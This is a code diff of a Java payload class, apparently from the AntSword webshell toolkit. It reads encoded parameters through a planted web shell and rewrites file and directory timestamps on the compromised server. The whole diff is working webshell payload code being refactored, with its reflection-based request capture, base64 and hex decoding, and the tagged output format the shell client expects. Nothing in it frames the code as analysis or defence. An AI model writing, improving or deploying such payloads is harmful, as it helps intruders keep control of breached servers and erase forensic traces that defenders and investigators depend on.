@@ -1,3 +1,5 @@
+package filemanager;
+
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.ByteArrayOutputStream;
@@ -18,7 +20,7 @@ public class Retime {
             Class clazz = Class.forName("javax.servlet.jsp.PageContext");
             request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
             response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception ex) {
+        } catch (Exception e) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -28,21 +30,12 @@ public class Retime {
                     Field resp = request2.getClass().getDeclaredField("response");
                     resp.setAccessible(true);
                     response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                } catch (Exception ex) {
+                    try {
+                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-            } else if (obj instanceof HttpServletResponse) {
-                response = (HttpServletResponse) obj;
-                try {
-                    Field resp = response.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                    Field req = response2.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    request = (HttpServletRequest) req.get(response2);
-                } catch (Exception e) {
-                    e.printStackTrace();
+                    }
                 }
             }
         }
@@ -50,7 +43,6 @@ public class Retime {
         encoder = "base64";
         cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
-        StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
         String varkey1 = "antswordargpath";
@@ -59,15 +51,19 @@ public class Retime {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String z1 = EC(decode(request.getParameter(varkey1) + ""));
-            String z2 = EC(decode(request.getParameter(varkey2) + ""));
-            output.append(tag_s);
-            sb.append(ModifyFileOrDirTimeCode(z1, z2));
-            output.append(sb.toString());
-            output.append(tag_e);
-            response.getWriter().print(output.toString());
+            String z1 = decode(request.getParameter(varkey1));
+            String z2 = decode(request.getParameter(varkey2));
+
+            output.append(ModifyFileOrDirTimeCode(z1, z2));
+
         } catch (Exception e) {
-            sb.append("ERROR" + ":// " + e.toString());
+
+            output.append("ERROR:// " + e.toString());
+
+        }
+        try {
+            response.getWriter().print(tag_s + output.toString() + tag_e);
+        } catch (Exception ignored) {
         }
         return true;
     }
@@ -97,21 +93,18 @@ public class Retime {
                 ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                 baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
-            return baos.toString("UTF-8");
+            return baos.toString(cs);
         } else if (encoder.equals("base64")) {
             byte[] bt = null;
-            String version = System.getProperty("java.version");
-            if (version.compareTo("1.9") >= 0) {
-                Class Base64 = Class.forName("java.util.Base64");
-                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new Object[]{});
-                bt = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);
-            } else {
-                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object Decoder = Base64.getDeclaredConstructor().newInstance();
-                bt = (byte[]) Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (ClassNotFoundException e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
             }
-
-            return new String(bt, "UTF-8");
+            return new String(bt, cs);
         }
         return str;
     }
